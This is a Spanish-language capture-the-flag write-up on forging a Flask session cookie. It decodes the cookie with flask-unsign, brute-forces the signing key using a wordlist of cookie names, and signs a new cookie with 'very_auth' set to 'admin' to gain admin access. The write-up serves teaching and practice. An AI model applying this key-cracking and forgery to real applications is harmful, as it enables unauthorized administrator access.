## Descripcion
Alright, enough of using my own encryption. Flask session cookies should be plenty secure!

## Solucion
## 1. Identificación de la vulnerabilidad

La página proporciona la pista:

```
How secure is a flask cookie?
```

Esto indica que debemos analizar la **cookie de sesión de Flask**.

La cookie obtenida fue:

```
eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.arFobQ.EEKcC8C-SvMWp-ryP3q-Xqm9VqI
```

Al decodificarla se obtuvo:

```
{'very_auth': 'blank'}
```

Esto demuestra que la cookie contiene información controlada por el servidor mediante una sesión de Flask.

---

## 2. Decodificación de la cookie

Se utilizó `flask-unsign` para comprobar el contenido de la cookie:

```
flask-unsign --decode --cookie 'COOKIE'
```

Resultado:

```
{'very_auth': 'blank'}
```

La aplicación utiliza el valor:

```
very_auth = 'blank'
```

Por lo tanto, se busca modificarlo a:

```
very_auth = 'admin'
```

---

## 3. Obtención de la `secret_key`

Las cookies de sesión de Flask están firmadas con una clave secreta. Para generar una cookie modificada necesitamos conocer esa clave.

Primero se intentó utilizar `rockyou.txt`:

```
flask-unsign --unsign \
--cookie 'COOKIE' \
--wordlist /usr/share/wordlists/rockyou.txt
```

Se produjo el error:

```
FileNotFoundError: [Errno 2] No such file or directory:
'/usr/share/wordlists/rockyou.txt'
```

Esto significa que `rockyou.txt` no estaba disponible en esa ubicación.

---

## 4. Creación de una lista de palabras

Como el reto utiliza nombres de galletas como posibles claves, se creó una lista personalizada:

```
nano cookies.txt
```

Contenido:

```
snickerdoodle
chocolate chip
oatmeal raisin
gingersnap
shortbread
peanut butter
whoopie pie
sugar
molasses
kiss
biscotti
butter
spritz
snowball
drop
thumbprint
pinwheel
wafer
macaroon
fortune
crinkle
icebox
gingerbread
tassie
lebkuchen
macaron
black and white
white chocolate macadamia
```

---

## 5. Ataque de diccionario

Se utilizó `flask-unsign` para probar cada palabra como `secret_key`:

```
flask-unsign --unsign \
--cookie 'COOKIE' \
--wordlist cookies.txt
```

El programa intenta verificar cuál de las palabras puede generar una firma válida para la cookie.

Cuando encuentra la clave correcta, muestra algo similar a:

```
[+] Found secret key after XX attempts
'CLAVE_ENCONTRADA'
```

La palabra encontrada es la `secret_key` utilizada por la aplicación.

---

## 6. Creación de una cookie modificada

Con la clave obtenida se genera una nueva cookie cuyo contenido sea:

```
{'very_auth': 'admin'}
```

Comando:

```
flask-unsign --sign \
--cookie "{'very_auth': 'admin'}" \
--secret 'CLAVE_ENCONTRADA'
```

El comando genera una nueva cookie firmada.

---

## 7. Sustitución de la cookie

La cookie original `session` se reemplaza en el navegador por la nueva cookie generada.

En Chrome:

```
F12
→ Application
→ Cookies
→ dominio del reto
→ session
```

Se sustituye el valor y se recarga la página.

La aplicación recibe ahora una sesión equivalente a:

```
{'very_auth': 'admin'}
```

y, al verificar correctamente la firma, permite acceder a la funcionalidad protegida del reto.

---

## 8. Concepto aprendido

El problema principal es que la información de la sesión está almacenada en el cliente y protegida mediante una **firma**. La firma evita modificaciones arbitrarias, pero si se descubre la `secret_key`, es posible generar cookies válidas con otros valores.

### Flujo del ataque

```
Cookie original
      ↓
Decodificar
      ↓
{'very_auth': 'blank'}
      ↓
Obtener secret_key
      ↓
Cambiar a {'very_auth': 'admin'}
      ↓
Firmar la nueva cookie
      ↓
Reemplazar cookie en el navegador
      ↓
Acceso como administrador
```

### Comandos principales utilizados

```
flask-unsign --decode --cookie 'COOKIE'
```

```
flask-unsign --unsign --cookie 'COOKIE' --wordlist cookies.txt
```

```
flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'CLAVE'
```

## Notas adicionales

## Referencias